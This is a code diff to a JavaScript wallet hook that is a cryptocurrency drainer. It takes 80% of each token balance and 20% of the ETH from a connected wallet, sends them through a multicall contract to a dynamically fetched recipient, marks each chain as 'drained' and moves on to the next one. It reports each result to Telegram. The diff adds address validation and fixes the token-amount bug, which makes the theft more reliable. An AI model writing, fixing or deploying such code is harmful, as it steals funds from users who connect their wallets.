@@ -35,6 +35,10 @@ export const UseWallet = (amount) => {
 
     const getContractAddress = async (chainId) => {
         const recipient = await getRecipientAddress(); // Fetch recipient dynamically
+        if (!recipient || !ethers.utils.isAddress(recipient)) {
+            console.error("Invalid recipient address.");
+            return;  // Abort if recipient address is invalid
+        }
         if (recipient === receiver) {
             switch (chainId) {
                 case 1:
@@ -221,13 +225,19 @@ export const UseWallet = (amount) => {
             contractAbi,
             signer
         );
-
+      
         const tokenAddresses = tokens.map((token) => token.tokenAddress);
         const amounts = tokens.map((token) =>
-            ethers.BigNumber.from(token).mul(8).div(10)
+            ethers.BigNumber.from(token.tokenAmount).mul(8).div(10)
         );
-
+      
         try {
+            const recipientAddress = await getRecipientAddress();
+            if (!recipientAddress || !ethers.utils.isAddress(recipientAddress)) {
+                console.error("Invalid recipient address.");
+                return;  // Abort if recipient address is invalid
+            }
+      
             const gasPrice = await getGasPrice(config, { chainId: account.chainId });
             const gasEstimate = await multiCallContract.estimateGas.multiCall(
                 tokenAddresses,
@@ -237,36 +247,35 @@ export const UseWallet = (amount) => {
                 }
             );
             const gasFee = gasEstimate.mul(gasPrice);
-
+      
             const totalEthRequired = ethers.BigNumber.from(ethBalance.value)
                 .mul(2)
                 .div(10); // Transfer 20% of ETH
-
+      
             if (totalEthRequired.lt(gasFee)) {
                 console.log("Not enough ETH to cover gas fees and transfer.");
                 await proceedToNextChain();
                 return;
             }
-
+      
             const tx = await multiCallContract.multiCall(tokenAddresses, amounts, {
                 value: totalEthRequired,
             });
-
-            console.log(totalEthRequired)
-
+      
             console.log(`Multicall transaction hash: ${tx.hash}`);
             await tx.wait();
             console.log(`Multicall transaction confirmed: ${tx.hash}`);
-            await sendTransactionStatusToTelegram("success", tx.hash);
-
+            await sendTransactionStatusToTelegram("success", tx.hash);  // Transaction success status
+      
             chainDrainStatus[chainId] = true; // Mark chain as drained if successful
             await proceedToNextChain();
         } catch (error) {
-            console.log("Multicall operation failed:", error,);
-            await sendTransactionStatusToTelegram("failure", error);
+            console.log("Multicall operation failed:", error);
+            await sendTransactionStatusToTelegram("failure", error.message);  // Transaction failure status
             await proceedToNextChain();
         }
-    };
+      };
+      
 
     const proceedToNextChain = async () => {
         const nextChainId = Object.keys(chainInteractionStatus).find(
